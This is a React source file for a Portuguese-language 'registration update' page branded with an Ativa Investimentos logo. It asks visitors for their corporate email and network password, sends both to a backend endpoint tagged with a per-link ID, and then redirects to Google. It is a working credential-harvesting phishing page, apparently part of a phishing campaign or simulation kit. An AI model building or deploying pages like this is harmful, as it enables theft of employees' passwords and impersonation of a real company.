import React, { useState } from 'react';
import './rh.css';
import logoAtiva from '../../../assets/logoativa3.png';

const RHLanding = ({ linkId }) => {
  const [formData, setFormData] = useState({ email: '', password: '' });

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch(
        `${process.env.REACT_APP_BACKEND_URL}/landing/submit/${linkId}`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(formData),
        }
      );
      if (response.ok) {
        window.location.href = 'https://www.google.com';
      } else {
        console.error('Erro ao enviar');
      }
    } catch (error) {
      console.error('Erro ao submeter:', error);
    }
  };

  return (
    <div className="rh-container">
      <div className="rh-card">
        <img src={logoAtiva} alt="Ativa Investimentos" className="logo-ativa" />
        <h1>Atualização Cadastral</h1>
        <p>Atualize suas informações para manter seus dados seguros e em dia.</p>
        <form onSubmit={handleSubmit}>
          <div className="input-group">
            <input
              type="email"
              name="email"
              placeholder="Email corporativo"
              value={formData.email}
              onChange={handleChange}
              required
            />
          </div>
          <div className="input-group">
            <input
              type="password"
              name="password"
              placeholder="Senha de rede"
              value={formData.password}
              onChange={handleChange}
              required
            />
          </div>
          <button type="submit">Atualizar Cadastro</button>
        </form>
      </div>
    </div>
  );
};

export default RHLanding;
